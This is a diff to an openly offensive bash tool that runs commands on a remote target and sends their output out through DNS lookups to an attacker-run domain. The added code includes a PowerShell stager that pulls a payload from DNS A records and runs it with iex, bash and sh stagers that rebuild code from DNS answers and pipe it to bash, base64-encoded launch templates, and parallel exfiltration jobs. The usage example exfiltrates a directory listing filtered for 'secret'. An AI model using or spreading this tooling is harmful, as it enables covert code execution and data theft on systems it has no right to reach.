@@ -6,8 +6,8 @@ debug=0
 shell=bash #bash, sh or powershell
 strict_label_charset=1
 outfile=/dev/stdout
-timeout=10
-threads=10
+timeout=20
+threads=5
 s_dns_trigger="dig +short"
 
 trap "setsid kill -2 -- -$(ps -o pgid= $$ | grep -o [0-9]*)" EXIT
@@ -34,7 +34,10 @@ Usage:
     
     Staged Mode:
     -z NSCONFIG         The path to the script that will have dnslivery running
-    -k S_DNS_TRIGGGER   The dns trigger for the stager, defaults to: "dig +short" 
+    -k S_DNS_CMD        The command used within the stager to get the DNS data, defaults to: 
+                        sh/bash: dig %host% +short
+                        powershell: Resolve-DnsName -ty a %host%|? Section -eq Answer|Select -Exp IPAddress
+                        The %host% is replaced later by the script with the actual host used for the DNS resolution
     
     Examples:
     stdbuf -oL tcpdump --immediate -l -i any udp port 53|$0 -h whatev.er -d "dig @0 +tries=5" -x dispatcher_examples/local_bash.sh -- 'ls -lha|grep secret'
@@ -135,7 +138,7 @@ while [[ $# -gt 0 ]]; do
         shift
         ;;
         -k)
-        s_dns_trigger="$2"
+        user_s_dns_cmd="$2"
         shift
         shift
         ;;
@@ -204,7 +207,9 @@ printf "Timeout: ${YELLOW}${timeout}${NC}\n"
 ##########sh definitions#######
 assign sh outer_cmd_template 'sh -c $@|base64${IFS}-d|sh . echo %CMD_B64%'
 
-assign sh stager_template '(seq %ITERATIONS%|%S_DNS_TRIGGGER% $(cat).%UNIQUE_DNS_HOST%|tr . \ |printf %02x $(cat)|xxd -r -p)|bash'
+assign sh stager_dns_cmd 'dig +short %host%'
+assign sh stager_host '$(cat).%UNIQUE_DNS_HOST%'
+assign sh stager_template '(seq %ITERATIONS%|%STAGER_DNS_CMD%|tr . \ |printf %02x $(cat)|xxd -r -p)|bash'
 
 assign sh inner_cmd_template "(${cmd})|base64 -w0|echo \$(cat)--|grep -Eo '.{1,%LABEL_SIZE%}'|xargs -n%NLABELS% echo|tr ' ' .|nl|awk '{printf \"%s.%s%s\n\",\$2,\$1,\"%UNIQUE_DNS_HOST%\"}'|xargs -P%THREADS% -n1 %DNS_TRIGGER%"
 [[ $strict_label_charset -eq 1 ]] && {
@@ -215,8 +220,10 @@ assign sh inner_cmd_template "(${cmd})|base64 -w0|echo \$(cat)--|grep -Eo '.{1,%
 ##########bash definitions#######
 assign bash outer_cmd_template 'bash -c {echo,%CMD_B64%}|{base64,-d}|bash'
 
-#assign bash stager_template 'while [[ ${a[*]} != "4 4 4 4" ]];do ((i++));printf %s "$c";IFS=. read -a a < <(%S_DNS_TRIGGGER% $i.%UNIQUE_DNS_HOST%);c=$(printf %02x ${a[*]}|xxd -r -p);done|bash'
-assign bash stager_template '(seq %ITERATIONS%|%S_DNS_TRIGGGER% $(cat).%UNIQUE_DNS_HOST%|tr . \ |printf %02x $(cat)|xxd -r -p)|bash'
+assign bash stager_dns_cmd 'dig +short %host%'
+assign bash stager_host '$(cat).%UNIQUE_DNS_HOST%'
+#assign bash stager_template 'while [[ ${a[*]} != "4 4 4 4" ]];do ((i++));printf %s "$c";IFS=. read -a a < <(%S_DNS_TRIGGER% $i.%UNIQUE_DNS_HOST%);c=$(printf %02x ${a[*]}|xxd -r -p);done|bash'
+assign bash stager_template '(seq %ITERATIONS%|%STAGER_DNS_CMD%|tr . \ |printf %02x $(cat)|xxd -r -p)|bash'
 
 assign bash inner_cmd_template "(${cmd})|base64 -w0|echo \$(cat)--|grep -Eo '.{1,%LABEL_SIZE%}'|xargs -n%NLABELS% echo|tr ' ' .|nl|awk '{printf \"%s.%s%s\n\",\$2,\$1,\"%UNIQUE_DNS_HOST%\"}'|xargs -P%THREADS% -n1 %DNS_TRIGGER%"
 [[ $strict_label_charset -eq 1 ]] && {
@@ -227,12 +234,22 @@ assign bash inner_cmd_template "(${cmd})|base64 -w0|echo \$(cat)--|grep -Eo '.{1
 ###########powershell definitions########
 assign powershell outer_cmd_template "powershell -enc %CMD_B64%"
 
+assign powershell stager_dns_cmd 'Resolve-DnsName -ty a %host%|? Section -eq Answer|Select -Exp IPAddress' 
+assign powershell stager_host '"${_}.%UNIQUE_DNS_HOST%"'
+assign powershell stager_template 'iex((1..%ITERATIONS%|%{%STAGER_DNS_CMD%|%{$_.split(".")|%{[char][int]$_}}}) -join "")'
+
 #since powershell v7, we can add -Parallel and throttleLimit as parameters to foreach for multi process/threading extraction
 #we cant really depend on it, for now serialized
-assign powershell inner_cmd_template "[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((${cmd})))+'--' -split '(.{1,%CHUNK_SIZE%})'|?{\$_}|%{\$i+=1;%DNS_TRIGGER% \$('{0}{1}{2}' -f (\$_ -replace '(.{1,%LABEL_SIZE%})','\$1.'),\$i,'%UNIQUE_DNS_HOST%')}"
+#assign powershell inner_cmd_template "[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((${cmd})))+'--' -split '(.{1,%CHUNK_SIZE%})'|?{\$_}|%{\$i+=1;%DNS_TRIGGER% \$('{0}{1}{2}' -f (\$_ -replace '(.{1,%LABEL_SIZE%})','\$1.'),\$i,'%UNIQUE_DNS_HOST%')}"
+#[[ $strict_label_charset -eq 1 ]] && {
+#    assign powershell inner_cmd_template "[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((${cmd})))+'--' -replace '\+','-1' -replace '/','-2' -replace '=','-3' -split '(.{1,%CHUNK_SIZE%})'|?{\$_}|%{\$i+=1;%DNS_TRIGGER% \$('{0}{1}{2}' -f (\$_ -replace '(.{1,%LABEL_SIZE%})','\$1.'),\$i,'%UNIQUE_DNS_HOST%')}"
+#}
+
+assign powershell inner_cmd_template "[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((${cmd})))+'--' -split '(.{1,%CHUNK_SIZE%})'|?{\$_}|%{\$i+=1;if((get-job).length -eq %THREADS%){get-job|wait-job -Any};remove-job -state Completed;start-job -scriptblock {param(\$s,\$i) %DNS_TRIGGER% \$('{0}{1}{2}' -f (\$s -replace '(.{1,%LABEL_SIZE%})','\$1.'),\$i,'%UNIQUE_DNS_HOST%')} -arg \$_,\$i}"
 [[ $strict_label_charset -eq 1 ]] && {
-    assign powershell inner_cmd_template "[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((${cmd})))+'--' -replace '\+','-1' -replace '/','-2' -replace '=','-3' -split '(.{1,%CHUNK_SIZE%})'|?{\$_}|%{\$i+=1;%DNS_TRIGGER% \$('{0}{1}{2}' -f (\$_ -replace '(.{1,%LABEL_SIZE%})','\$1.'),\$i,'%UNIQUE_DNS_HOST%')}"
+    assign powershell inner_cmd_template "[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((${cmd})))+'--' -replace '\+','-1' -replace '/','-2' -replace '=','-3' -split '(.{1,%CHUNK_SIZE%})'|?{\$_}|%{\$i+=1;if((get-job).length -eq %THREADS%){get-job|wait-job -Any};remove-job -state Completed;start-job -scriptblock {param(\$s,\$i) %DNS_TRIGGER% \$('{0}{1}{2}' -f (\$s -replace '(.{1,%LABEL_SIZE%})','\$1.'),\$i,'%UNIQUE_DNS_HOST%')} -arg \$_,\$i}"
 }
+
 
 #######end of definitions###########
 
@@ -249,6 +266,8 @@ exec 0</dev/tty
 run_uid=$(date +%s) #used to identify the traffic generated by the current session
 stager_unique_dns_host="${run_uid}s.${dns_host}"
 unique_dns_host="${run_uid}.${dns_host}"
+
+stager_dns_cmd=${user_s_dns_cmd:-$stager_dns_cmd}
 
 #extracting command output length
 echo -e "\nTrying to execute: \"${cmd}\""
@@ -276,8 +295,9 @@ else
     }
     
     stager=${stager_template}
-    stager=${stager//'%UNIQUE_DNS_HOST%'/$stager_unique_dns_host}
-    stager=${stager//'%S_DNS_TRIGGGER%'/$s_dns_trigger}
+    stager=${stager//'%STAGER_DNS_CMD%'/"$stager_dns_cmd"}
+    stager=${stager//'%host%'/"$stager_host"}
+    stager=${stager//'%UNIQUE_DNS_HOST%'/"$stager_unique_dns_host"}
     stager=${stager//'%ITERATIONS%'/$(((${#inner_cmd}+3)/4))}
     cmd_b64=$(echo "$stager"|b64)
     echo "Stager: $stager"
@@ -292,6 +312,7 @@ debug_print "outer_cmd[${#outer_cmd}]=$outer_cmd"
 
 echo "$outer_cmd"|"$dispatcher" >/dev/null 2>&1 &
     
+nchunks=-1
 postfix="$unique_dns_host"
 all_chunks=()
 last_valid_time=$SECONDS
@@ -310,10 +331,8 @@ while :;do
         debug_print "index=$index chunk=$chunk"
         
         [[ ${#chunk} -ne $((nlabels*label_size)) ]] && nchunks=$index
-        [[ $chunk == *-- ]] && {
-            nchunks=$index
-            chunk=${chunk%--}
-        }
+        [[ $chunk == *-- ]] && nchunks=$index
+        [[ $chunk == - ]] && nchunks=$index
         
         all_chunks[$index]=$chunk
         [[ ${#all_chunks[@]} -eq $nchunks ]] && break
@@ -324,4 +343,4 @@ done && echo
 
 (IFS=;echo "${all_chunks[*]}")|strict_translator -d|b64 -d>>"${outfile}"
 
-[[ -z $nchunks ]] && printf "\n${RED}Missing the output signature: try increasing timeout${NC}"
+[[ ! ${#all_chunks[@]} -eq $nchunks  ]] && printf "\n${RED}Missing chunks: try increasing timeout${NC}"
